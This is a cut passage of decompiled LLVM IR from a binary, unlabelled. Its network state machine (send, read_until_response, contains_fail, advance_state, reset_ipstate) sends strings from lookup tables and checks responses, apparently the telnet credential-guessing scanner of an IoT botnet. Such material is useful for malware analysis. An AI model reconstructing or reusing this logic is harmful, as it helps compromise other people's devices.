  %v2_8052c37 = add i32 %v1_8052c37, 16
  %v3_8052c37 = inttoptr i32 %v2_8052c37 to i32*
  store i32 %v2_8052c31, i32* %v3_8052c37, align 4
  store i32 %v2_8052c3b, i32* %eax.global-to-local, align 4
  %v1_8052c41 = load i32, i32* @esp, align 4
  %v2_8052c41 = add i32 %v1_8052c41, 12
  %v3_8052c41 = inttoptr i32 %v2_8052c41 to i32*
  store i32 %v2_8052c3b, i32* %v3_8052c41, align 4
  %v0_8052c45 = load i32, i32* @esp, align 4
  %v1_8052c45 = add i32 %v0_8052c45, 8
  %v2_8052c45 = inttoptr i32 %v1_8052c45 to i32*
  store i32 4, i32* %v2_8052c45, align 4
  %v0_8052c4d = load i32, i32* @esp, align 4
  %v1_8052c4d = add i32 %v0_8052c4d, 4
  %v2_8052c4d = inttoptr i32 %v1_8052c4d to i32*
  store i32 1, i32* %v2_8052c4d, align 4
  %v0_8052c55 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052c55 = load i32, i32* @esp, align 4
  %v2_8052c55 = inttoptr i32 %v1_8052c55 to i32*
  store i32 %v0_8052c55, i32* %v2_8052c55, align 4
  %v0_8052c58 = load i32, i32* %stack_var_-336, align 4
  %v2_8052c58 = call i32 @getsockopt(i32 %v0_8052c58)
  %v3_8052c5d = load i32, i32* %stack_var_-336, align 4
  store i32 %v3_8052c5d, i32* %eax.global-to-local, align 4
  %v1_8052c63 = icmp eq i32 %v3_8052c5d, 0
  store i32 %v2_8052831, i32* @edx, align 4
  br i1 %v1_8052c63, label %dec_label_pc_8052c80, label %dec_label_pc_8052c67

dec_label_pc_8052c67:                             ; preds = %dec_label_pc_8052c11
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v1_8052c73 = load i32, i32* @esp, align 4
  %v2_8052c73 = inttoptr i32 %v1_8052c73 to i32*
  store i32 %v2_80528d5, i32* %v2_8052c73, align 4
  %v0_8052c76 = load i32, i32* %stack_var_-336, align 4
  %v1_8052c76 = call i32 @reset_ipstate(i32 %v0_8052c76)
  store i32 %v1_8052c76, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8052c80:                             ; preds = %dec_label_pc_8052c11
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v4_8052c89 = load i32, i32* %v3_8052b97, align 16
  store i32 %v4_8052c89, i32* %eax.global-to-local, align 4
  %v0_8052c8c = load i32, i32* @esp, align 4
  %v1_8052c8c = add i32 %v0_8052c8c, 8
  %v2_8052c8c = inttoptr i32 %v1_8052c8c to i32*
  store i32 0, i32* %v2_8052c8c, align 4
  %v0_8052c94 = load i32, i32* @esp, align 4
  %v1_8052c94 = add i32 %v0_8052c94, 4
  %v2_8052c94 = inttoptr i32 %v1_8052c94 to i32*
  store i32 3, i32* %v2_8052c94, align 4
  %v0_8052c9c = load i32, i32* %eax.global-to-local, align 4
  %v1_8052c9c = load i32, i32* @esp, align 4
  %v2_8052c9c = inttoptr i32 %v1_8052c9c to i32*
  store i32 %v0_8052c9c, i32* %v2_8052c9c, align 4
  %v0_8052c9f = load i32, i32* %stack_var_-336, align 4
  %v1_8052c9f = load i32, i32* %stack_var_-332, align 4
  %v2_8052c9f = load i32, i32* %stack_var_-328, align 4
  %v3_8052c9f = call i32 @fcntl(i32 %v0_8052c9f, i32 %v1_8052c9f, i32 %v2_8052c9f)
  %v1_8052ca6 = and i32 %v3_8052c9f, -2049
  store i32 %v1_8052ca6, i32* @ecx, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v4_8052cb5 = load i32, i32* %v3_8052b97, align 16
  store i32 %v4_8052cb5, i32* %eax.global-to-local, align 4
  %v1_8052cb8 = load i32, i32* @esp, align 4
  %v2_8052cb8 = add i32 %v1_8052cb8, 8
  %v3_8052cb8 = inttoptr i32 %v2_8052cb8 to i32*
  store i32 %v1_8052ca6, i32* %v3_8052cb8, align 4
  %v0_8052cbc = load i32, i32* @esp, align 4
  %v1_8052cbc = add i32 %v0_8052cbc, 4
  %v2_8052cbc = inttoptr i32 %v1_8052cbc to i32*
  store i32 4, i32* %v2_8052cbc, align 4
  %v0_8052cc4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052cc4 = load i32, i32* @esp, align 4
  %v2_8052cc4 = inttoptr i32 %v1_8052cc4 to i32*
  store i32 %v0_8052cc4, i32* %v2_8052cc4, align 4
  %v0_8052cc7 = load i32, i32* %stack_var_-336, align 4
  %v1_8052cc7 = load i32, i32* %stack_var_-332, align 4
  %v2_8052cc7 = load i32, i32* %stack_var_-328, align 4
  %v3_8052cc7 = call i32 @fcntl(i32 %v0_8052cc7, i32 %v1_8052cc7, i32 %v2_8052cc7)
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v0_8052cd8 = load i32, i32* @esp, align 4
  %v1_8052cd8 = add i32 %v0_8052cd8, 4
  %v2_8052cd8 = inttoptr i32 %v1_8052cd8 to i32*
  store i32 2, i32* %v2_8052cd8, align 4
  %v0_8052ce0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052ce0 = load i32, i32* @esp, align 4
  %v2_8052ce0 = inttoptr i32 %v1_8052ce0 to i32*
  store i32 %v0_8052ce0, i32* %v2_8052ce0, align 4
  %v0_8052ce3 = load i32, i32* %stack_var_-336, align 4
  %v1_8052ce3 = load i32, i32* %stack_var_-332, align 4
  %v2_8052ce3 = inttoptr i32 %v0_8052ce3 to i32*
  %v3_8052ce3 = call i32 @advance_state(i32* %v2_8052ce3, i32 %v1_8052ce3)
  store i32 %v3_8052ce3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8052ced:                             ; preds = %dec_label_pc_8052b75
  %v13_8052ced = icmp eq i32 %v5_8052bff, -1
  %v1_8052cf1 = icmp eq i1 %v13_8052ced, false
  store i32 %v2_8052831, i32* @edx, align 4
  br i1 %v1_8052cf1, label %dec_label_pc_8052d0c, label %dec_label_pc_8052cf3

dec_label_pc_8052cf3:                             ; preds = %dec_label_pc_8052ced
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v1_8052cff = load i32, i32* @esp, align 4
  %v2_8052cff = inttoptr i32 %v1_8052cff to i32*
  store i32 %v2_80528d5, i32* %v2_8052cff, align 4
  %v1_8052d02 = call i32 @reset_ipstate(i32 %v5_8052bff)
  store i32 %v1_8052d02, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8052d0c:                             ; preds = %dec_label_pc_8052ced
  store i32 %v1_80528d7, i32* %eax.global-to-local, align 4
  %v2_8052d1a = load i32, i32* %v1_80528da, align 16
  store i32 %v2_8052d1a, i32* %eax.global-to-local, align 4
  %v1_8052d1c = add i32 %v2_8052d1a, 6
  store i32 %v1_8052d1c, i32* @ebx, align 4
  %v0_8052d1f = load i32, i32* @esp, align 4
  %v1_8052d1f = inttoptr i32 %v0_8052d1f to i32*
  store i32 0, i32* %v1_8052d1f, align 4
  %v1_8052d26 = inttoptr i32 %v5_8052bff to i32*
  %v2_8052d26 = call i32 @__GI_time(i32* %v1_8052d26)
  store i32 %v2_8052d26, i32* %eax.global-to-local, align 4
  %v0_8052d2b = load i32, i32* @ebx, align 4
  %v7_8052d2b = icmp ult i32 %v0_8052d2b, %v2_8052d26
  %v1_8052d2d = icmp eq i1 %v7_8052d2b, false
  br i1 %v1_8052d2d, label %dec_label_pc_805372c, label %dec_label_pc_8052d33

dec_label_pc_8052d33:                             ; preds = %dec_label_pc_8052d0c
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v1_8052d3f = load i32, i32* @esp, align 4
  %v2_8052d3f = inttoptr i32 %v1_8052d3f to i32*
  store i32 %v2_80528d5, i32* %v2_8052d3f, align 4
  %v0_8052d42 = load i32, i32* %stack_var_-336, align 4
  %v1_8052d42 = call i32 @reset_ipstate(i32 %v0_8052d42)
  store i32 %v1_8052d42, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8052d4c:                             ; preds = %dec_label_pc_8052900
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  %v1_8052d57 = add i32 %v2_80528d5, 28
  store i32 %v1_8052d57, i32* %eax.global-to-local, align 4
  %v1_8052d5a = inttoptr i32 %v1_8052d57 to i32*
  %v2_8052d5a = load i32, i32* %v1_8052d5a, align 4
  store i32 %v2_8052d5a, i32* %ecx.global-to-local, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v3_8052d65 = inttoptr i32 %v2_80528d5 to i32*
  %v4_8052d65 = load i32, i32* %v3_8052d65, align 16
  store i32 %v4_8052d65, i32* %edx.global-to-local, align 4
  %v0_8052d68 = load i32, i32* @esp, align 4
  %v1_8052d68 = add i32 %v0_8052d68, 16
  %v2_8052d68 = inttoptr i32 %v1_8052d68 to i32*
  store i32 134679696, i32* %v2_8052d68, align 4
  %v0_8052d70 = load i32, i32* @esp, align 4
  %v1_8052d70 = add i32 %v0_8052d70, 12
  %v2_8052d70 = inttoptr i32 %v1_8052d70 to i32*
  store i32 1024, i32* %v2_8052d70, align 4
  %v0_8052d78 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052d78 = load i32, i32* @esp, align 4
  %v2_8052d78 = add i32 %v1_8052d78, 8
  %v3_8052d78 = inttoptr i32 %v2_8052d78 to i32*
  store i32 %v0_8052d78, i32* %v3_8052d78, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_8052d7f = load i32, i32* @esp, align 4
  %v2_8052d7f = add i32 %v1_8052d7f, 4
  %v3_8052d7f = inttoptr i32 %v2_8052d7f to i32*
  store i32 %arg1, i32* %v3_8052d7f, align 4
  %v0_8052d83 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052d83 = load i32, i32* @esp, align 4
  %v2_8052d83 = inttoptr i32 %v1_8052d83 to i32*
  store i32 %v0_8052d83, i32* %v2_8052d83, align 4
  %v1_8052d86 = call i32 @read_until_response(i32 %v6_8052909)
  %v1_8052d8b = icmp eq i32 %v1_8052d86, 0
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  br i1 %v1_8052d8b, label %dec_label_pc_8052ded, label %dec_label_pc_8052d8f

dec_label_pc_8052d8f:                             ; preds = %dec_label_pc_8052d4c
  store i32 %v1_8052d57, i32* %eax.global-to-local, align 4
  %v2_8052d9d = load i32, i32* %v1_8052d5a, align 4
  store i32 %v2_8052d9d, i32* %eax.global-to-local, align 4
  %v1_8052d9f = load i32, i32* @esp, align 4
  %v2_8052d9f = inttoptr i32 %v1_8052d9f to i32*
  store i32 %v2_8052d9d, i32* %v2_8052d9f, align 4
  %v0_8052da2 = load i32, i32* %stack_var_-336, align 4
  %v1_8052da2 = call i32 @contains_fail(i32 %v0_8052da2)
  %v1_8052da7 = icmp eq i32 %v1_8052da2, 0
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v0_8052dd8 = load i32, i32* @esp, align 4
  %v1_8052dd8 = add i32 %v0_8052dd8, 4
  %v2_8052dd8 = inttoptr i32 %v1_8052dd8 to i32*
  br i1 %v1_8052da7, label %dec_label_pc_8052dcc, label %dec_label_pc_8052dab

dec_label_pc_8052dab:                             ; preds = %dec_label_pc_8052d8f
  store i32 0, i32* %v2_8052dd8, align 4
  %v0_8052dbf = load i32, i32* %eax.global-to-local, align 4
  %v1_8052dbf = load i32, i32* @esp, align 4
  %v2_8052dbf = inttoptr i32 %v1_8052dbf to i32*
  store i32 %v0_8052dbf, i32* %v2_8052dbf, align 4
  %v0_8052dc2 = load i32, i32* %stack_var_-336, align 4
  %v1_8052dc2 = load i32, i32* %stack_var_-332, align 4
  %v2_8052dc2 = inttoptr i32 %v0_8052dc2 to i32*
  %v3_8052dc2 = call i32 @advance_state(i32* %v2_8052dc2, i32 %v1_8052dc2)
  store i32 %v3_8052dc2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8052dcc:                             ; preds = %dec_label_pc_8052d8f
  store i32 3, i32* %v2_8052dd8, align 4
  %v0_8052de0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052de0 = load i32, i32* @esp, align 4
  %v2_8052de0 = inttoptr i32 %v1_8052de0 to i32*
  store i32 %v0_8052de0, i32* %v2_8052de0, align 4
  %v0_8052de3 = load i32, i32* %stack_var_-336, align 4
  %v1_8052de3 = load i32, i32* %stack_var_-332, align 4
  %v2_8052de3 = inttoptr i32 %v0_8052de3 to i32*
  %v3_8052de3 = call i32 @advance_state(i32* %v2_8052de3, i32 %v1_8052de3)
  store i32 %v3_8052de3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8052ded:                             ; preds = %dec_label_pc_8052d4c
  store i32 %v1_80528d7, i32* %eax.global-to-local, align 4
  %v2_8052dfb = load i32, i32* %v1_80528da, align 16
  store i32 %v2_8052dfb, i32* %eax.global-to-local, align 4
  %v1_8052dfd = add i32 %v2_8052dfb, 6
  store i32 %v1_8052dfd, i32* @ebx, align 4
  %v0_8052e00 = load i32, i32* @esp, align 4
  %v1_8052e00 = inttoptr i32 %v0_8052e00 to i32*
  store i32 0, i32* %v1_8052e00, align 4
  %v0_8052e07 = load i32, i32* %stack_var_-336, align 4
  %v1_8052e07 = inttoptr i32 %v0_8052e07 to i32*
  %v2_8052e07 = call i32 @__GI_time(i32* %v1_8052e07)
  store i32 %v2_8052e07, i32* %eax.global-to-local, align 4
  %v0_8052e0c = load i32, i32* @ebx, align 4
  %v7_8052e0c = icmp ult i32 %v0_8052e0c, %v2_8052e07
  %v1_8052e0e = icmp eq i1 %v7_8052e0c, false
  br i1 %v1_8052e0e, label %dec_label_pc_805372c, label %dec_label_pc_8052e14

dec_label_pc_8052e14:                             ; preds = %dec_label_pc_8052ded
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v1_8052e20 = load i32, i32* @esp, align 4
  %v2_8052e20 = inttoptr i32 %v1_8052e20 to i32*
  store i32 %v2_80528d5, i32* %v2_8052e20, align 4
  %v0_8052e23 = load i32, i32* %stack_var_-336, align 4
  %v1_8052e23 = call i32 @reset_ipstate(i32 %v0_8052e23)
  store i32 %v1_8052e23, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8052e2d:                             ; preds = %dec_label_pc_8052900
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v2_8052e36 = or i32 %v2_80528d2, 10
  %v3_8052e36 = add i32 %v2_8052e36, %v2_8052831
  %v4_8052e36 = inttoptr i32 %v3_8052e36 to i8*
  %v5_8052e36 = load i8, i8* %v4_8052e36, align 2
  %v6_8052e36 = zext i8 %v5_8052e36 to i32
  store i32 %v6_8052e36, i32* %eax.global-to-local, align 4
  %v1_8052e3e = mul nuw nsw i32 %v6_8052e36, 4
  %v2_8052e3e = add nuw nsw i32 %v1_8052e3e, 134678880
  %v3_8052e3e = inttoptr i32 %v2_8052e3e to i32*
  %v4_8052e3e = load i32, i32* %v3_8052e3e, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8052e50 = and i32 %v4_8052e3e, -256
  store i32 %v1_8052e50, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8052e53 = inttoptr i32 %v4_8052e3e to i8*
  store i32 %v4_8052e3e, i32* @edi, align 4
  %v3_8052e59 = call i32 @_strlen(i8* %v4_8052e53)
  %v4_8052e59 = mul i32 %v3_8052e59, -1
  %v5_8052e59 = add i32 %v4_8052e59, -2
  store i32 %v5_8052e59, i32* %ecx.global-to-local, align 4
  %v1_8052e5f = sub i32 0, %v4_8052e59
  store i32 %v1_8052e5f, i32* @ebx, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v5_8052e6b = load i8, i8* %v4_8052e36, align 2
  %v6_8052e6b = zext i8 %v5_8052e6b to i32
  store i32 %v6_8052e6b, i32* %eax.global-to-local, align 4
  %v1_8052e73 = mul nuw nsw i32 %v6_8052e6b, 4
  %v2_8052e73 = add nuw nsw i32 %v1_8052e73, 134678880
  %v3_8052e73 = inttoptr i32 %v2_8052e73 to i32*
  %v4_8052e73 = load i32, i32* %v3_8052e73, align 4
  store i32 %v4_8052e73, i32* @ecx, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v3_8052e83 = inttoptr i32 %v2_80528d5 to i32*
  %v4_8052e83 = load i32, i32* %v3_8052e83, align 16
  store i32 %v4_8052e83, i32* %eax.global-to-local, align 4
  %v0_8052e86 = load i32, i32* @esp, align 4
  %v1_8052e86 = add i32 %v0_8052e86, 12
  %v2_8052e86 = inttoptr i32 %v1_8052e86 to i32*
  store i32 16384, i32* %v2_8052e86, align 4
  %v0_8052e8e = load i32, i32* @ebx, align 4
  %v1_8052e8e = load i32, i32* @esp, align 4
  %v2_8052e8e = add i32 %v1_8052e8e, 8
  %v3_8052e8e = inttoptr i32 %v2_8052e8e to i32*
  store i32 %v0_8052e8e, i32* %v3_8052e8e, align 4
  %v0_8052e92 = load i32, i32* @ecx, align 4
  %v1_8052e92 = load i32, i32* @esp, align 4
  %v2_8052e92 = add i32 %v1_8052e92, 4
  %v3_8052e92 = inttoptr i32 %v2_8052e92 to i32*
  store i32 %v0_8052e92, i32* %v3_8052e92, align 4
  %v0_8052e96 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e96 = load i32, i32* @esp, align 4
  %v2_8052e96 = inttoptr i32 %v1_8052e96 to i32*
  store i32 %v0_8052e96, i32* %v2_8052e96, align 4
  %v4_8052e99 = call i32 @send(i32 %v4_8052e3e, i32 %v2_8052831, i32 %v6_8052909, i32 %v15_805272a)
  store i32 %v4_8052e99, i32* %eax.global-to-local, align 4
  %v2_8052e9e = icmp slt i32 %v4_8052e99, 0
  %v1_8052ea0 = icmp eq i1 %v2_8052e9e, false
  store i32 %v2_8052831, i32* @edx, align 4
  br i1 %v1_8052ea0, label %dec_label_pc_8052ebb, label %dec_label_pc_8052ea2

dec_label_pc_8052ea2:                             ; preds = %dec_label_pc_8052e2d
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v1_8052eae = load i32, i32* @esp, align 4
  %v2_8052eae = inttoptr i32 %v1_8052eae to i32*
  store i32 %v2_80528d5, i32* %v2_8052eae, align 4
  %v1_8052eb1 = call i32 @reset_ipstate(i32 %v4_8052e3e)
  store i32 %v1_8052eb1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8052ebb:                             ; preds = %dec_label_pc_8052e2d
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v4_8052ec4 = load i32, i32* %v3_8052e83, align 16
  store i32 %v4_8052ec4, i32* %eax.global-to-local, align 4
  %v0_8052ec7 = load i32, i32* @esp, align 4
  %v1_8052ec7 = add i32 %v0_8052ec7, 12
  %v2_8052ec7 = inttoptr i32 %v1_8052ec7 to i32*
  store i32 16384, i32* %v2_8052ec7, align 4
  %v0_8052ecf = load i32, i32* @esp, align 4
  %v1_8052ecf = add i32 %v0_8052ecf, 8
  %v2_8052ecf = inttoptr i32 %v1_8052ecf to i32*
  store i32 2, i32* %v2_8052ecf, align 4
  %v0_8052ed7 = load i32, i32* @esp, align 4
  %v1_8052ed7 = add i32 %v0_8052ed7, 4
  %v2_8052ed7 = inttoptr i32 %v1_8052ed7 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_806b173.275 to i32), i32* %v2_8052ed7, align 4
  %v0_8052edf = load i32, i32* %eax.global-to-local, align 4
  %v1_8052edf = load i32, i32* @esp, align 4
  %v2_8052edf = inttoptr i32 %v1_8052edf to i32*
  store i32 %v0_8052edf, i32* %v2_8052edf, align 4
  %v4_8052ee2 = call i32 @send(i32 %v4_8052e3e, i32 %v2_8052831, i32 %v6_8052909, i32 %v15_805272a)
  %v2_8052ee7 = icmp slt i32 %v4_8052ee2, 0
  %v1_8052ee9 = icmp eq i1 %v2_8052ee7, false
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v0_8052f10 = load i32, i32* @esp, align 4
  br i1 %v1_8052ee9, label %dec_label_pc_8052f04, label %dec_label_pc_8052eeb

dec_label_pc_8052eeb:                             ; preds = %dec_label_pc_8052ebb
  %v2_8052ef7 = inttoptr i32 %v0_8052f10 to i32*
  store i32 %v2_80528d5, i32* %v2_8052ef7, align 4
  %v1_8052efa = call i32 @reset_ipstate(i32 %v4_8052e3e)
  store i32 %v1_8052efa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8052f04:                             ; preds = %dec_label_pc_8052ebb
  %v1_8052f10 = add i32 %v0_8052f10, 4
  %v2_8052f10 = inttoptr i32 %v1_8052f10 to i32*
  store i32 4, i32* %v2_8052f10, align 4
  %v0_8052f18 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052f18 = load i32, i32* @esp, align 4
  %v2_8052f18 = inttoptr i32 %v1_8052f18 to i32*
  store i32 %v0_8052f18, i32* %v2_8052f18, align 4
  %v2_8052f1b = inttoptr i32 %v4_8052e3e to i32*
  %v3_8052f1b = call i32 @advance_state(i32* %v2_8052f1b, i32 %v2_8052831)
  store i32 %v3_8052f1b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8052f25:                             ; preds = %dec_label_pc_8052900
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  %v1_8052f30 = add i32 %v2_80528d5, 28
  store i32 %v1_8052f30, i32* %eax.global-to-local, align 4
  %v1_8052f33 = inttoptr i32 %v1_8052f30 to i32*
  %v2_8052f33 = load i32, i32* %v1_8052f33, align 4
  store i32 %v2_8052f33, i32* %ecx.global-to-local, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v3_8052f3e = inttoptr i32 %v2_80528d5 to i32*
  %v4_8052f3e = load i32, i32* %v3_8052f3e, align 16
  store i32 %v4_8052f3e, i32* %edx.global-to-local, align 4
  %v0_8052f41 = load i32, i32* @esp, align 4
  %v1_8052f41 = add i32 %v0_8052f41, 16
  %v2_8052f41 = inttoptr i32 %v1_8052f41 to i32*
  store i32 ptrtoint (i32* @global_var_8070c90 to i32), i32* %v2_8052f41, align 4
  %v0_8052f49 = load i32, i32* @esp, align 4
  %v1_8052f49 = add i32 %v0_8052f49, 12
  %v2_8052f49 = inttoptr i32 %v1_8052f49 to i32*
  store i32 1024, i32* %v2_8052f49, align 4
  %v0_8052f51 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052f51 = load i32, i32* @esp, align 4
  %v2_8052f51 = add i32 %v1_8052f51, 8
  %v3_8052f51 = inttoptr i32 %v2_8052f51 to i32*
  store i32 %v0_8052f51, i32* %v3_8052f51, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_8052f58 = load i32, i32* @esp, align 4
  %v2_8052f58 = add i32 %v1_8052f58, 4
  %v3_8052f58 = inttoptr i32 %v2_8052f58 to i32*
  store i32 %arg1, i32* %v3_8052f58, align 4
  %v0_8052f5c = load i32, i32* %edx.global-to-local, align 4
  %v1_8052f5c = load i32, i32* @esp, align 4
  %v2_8052f5c = inttoptr i32 %v1_8052f5c to i32*
  store i32 %v0_8052f5c, i32* %v2_8052f5c, align 4
  %v1_8052f5f = call i32 @read_until_response(i32 %v6_8052909)
  %v1_8052f64 = icmp eq i32 %v1_8052f5f, 0
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  br i1 %v1_8052f64, label %dec_label_pc_8052fc6, label %dec_label_pc_8052f68

dec_label_pc_8052f68:                             ; preds = %dec_label_pc_8052f25
  store i32 %v1_8052f30, i32* %eax.global-to-local, align 4
  %v2_8052f76 = load i32, i32* %v1_8052f33, align 4
  store i32 %v2_8052f76, i32* %eax.global-to-local, align 4
  %v1_8052f78 = load i32, i32* @esp, align 4
  %v2_8052f78 = inttoptr i32 %v1_8052f78 to i32*
  store i32 %v2_8052f76, i32* %v2_8052f78, align 4
  %v1_8052f7b = call i32 @contains_fail(i32 %stack_var_-624.284)
  %v1_8052f80 = icmp eq i32 %v1_8052f7b, 0
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v0_8052fb1 = load i32, i32* @esp, align 4
  %v1_8052fb1 = add i32 %v0_8052fb1, 4
  %v2_8052fb1 = inttoptr i32 %v1_8052fb1 to i32*
  br i1 %v1_8052f80, label %dec_label_pc_8052fa5, label %dec_label_pc_8052f84

dec_label_pc_8052f84:                             ; preds = %dec_label_pc_8052f68
  store i32 0, i32* %v2_8052fb1, align 4
  %v0_8052f98 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052f98 = load i32, i32* @esp, align 4
  %v2_8052f98 = inttoptr i32 %v1_8052f98 to i32*
  store i32 %v0_8052f98, i32* %v2_8052f98, align 4
  %v2_8052f9b = inttoptr i32 %stack_var_-624.284 to i32*
  %v3_8052f9b = call i32 @advance_state(i32* %v2_8052f9b, i32 %v2_8052831)
  store i32 %v3_8052f9b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8052fa5:                             ; preds = %dec_label_pc_8052f68
  store i32 5, i32* %v2_8052fb1, align 4
  %v0_8052fb9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052fb9 = load i32, i32* @esp, align 4
  %v2_8052fb9 = inttoptr i32 %v1_8052fb9 to i32*
  store i32 %v0_8052fb9, i32* %v2_8052fb9, align 4
  %v2_8052fbc = inttoptr i32 %stack_var_-624.284 to i32*
  %v3_8052fbc = call i32 @advance_state(i32* %v2_8052fbc, i32 %v2_8052831)
  store i32 %v3_8052fbc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8052fc6:                             ; preds = %dec_label_pc_8052f25
  store i32 %v1_80528d7, i32* %eax.global-to-local, align 4
  %v2_8052fd4 = load i32, i32* %v1_80528da, align 16
  store i32 %v2_8052fd4, i32* %eax.global-to-local, align 4
  %v1_8052fd6 = add i32 %v2_8052fd4, 6
  store i32 %v1_8052fd6, i32* @ebx, align 4
  %v0_8052fd9 = load i32, i32* @esp, align 4
  %v1_8052fd9 = inttoptr i32 %v0_8052fd9 to i32*
  store i32 0, i32* %v1_8052fd9, align 4
  %v1_8052fe0 = inttoptr i32 %stack_var_-624.284 to i32*
  %v2_8052fe0 = call i32 @__GI_time(i32* %v1_8052fe0)
  store i32 %v2_8052fe0, i32* %eax.global-to-local, align 4
  %v0_8052fe5 = load i32, i32* @ebx, align 4
  %v7_8052fe5 = icmp ult i32 %v0_8052fe5, %v2_8052fe0
  %v1_8052fe7 = icmp eq i1 %v7_8052fe5, false
  br i1 %v1_8052fe7, label %dec_label_pc_805372c, label %dec_label_pc_8052fed

dec_label_pc_8052fed:                             ; preds = %dec_label_pc_8052fc6
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v1_8052ff9 = load i32, i32* @esp, align 4
  %v2_8052ff9 = inttoptr i32 %v1_8052ff9 to i32*
  store i32 %v2_80528d5, i32* %v2_8052ff9, align 4
  %v1_8052ffc = call i32 @reset_ipstate(i32 %stack_var_-624.284)
  store i32 %v1_8052ffc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8053006:                             ; preds = %dec_label_pc_8052900
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v2_805300f = or i32 %v2_80528d2, 11
  %v3_805300f = add i32 %v2_805300f, %v2_8052831
  %v4_805300f = inttoptr i32 %v3_805300f to i8*
  %v5_805300f = load i8, i8* %v4_805300f, align 1
  %v6_805300f = zext i8 %v5_805300f to i32
  store i32 %v6_805300f, i32* %eax.global-to-local, align 4
  %v1_8053017 = mul nuw nsw i32 %v6_805300f, 4
  %v2_8053017 = add nuw nsw i32 %v1_8053017, 134679296
  %v3_8053017 = inttoptr i32 %v2_8053017 to i32*
  %v4_8053017 = load i32, i32* %v3_8053017, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8053029 = and i32 %v4_8053017, -256
  store i32 %v1_8053029, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_805302c = inttoptr i32 %v4_8053017 to i8*
  store i32 %v4_8053017, i32* @edi, align 4
  %v3_8053032 = call i32 @_strlen(i8* %v4_805302c)
  %v4_8053032 = mul i32 %v3_8053032, -1
  %v5_8053032 = add i32 %v4_8053032, -2
  store i32 %v5_8053032, i32* %ecx.global-to-local, align 4
  %v1_8053038 = sub i32 0, %v4_8053032
  store i32 %v1_8053038, i32* @ebx, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v5_8053044 = load i8, i8* %v4_805300f, align 1
  %v6_8053044 = zext i8 %v5_8053044 to i32
  store i32 %v6_8053044, i32* %eax.global-to-local, align 4
  %v1_805304c = mul nuw nsw i32 %v6_8053044, 4
  %v2_805304c = add nuw nsw i32 %v1_805304c, 134679296
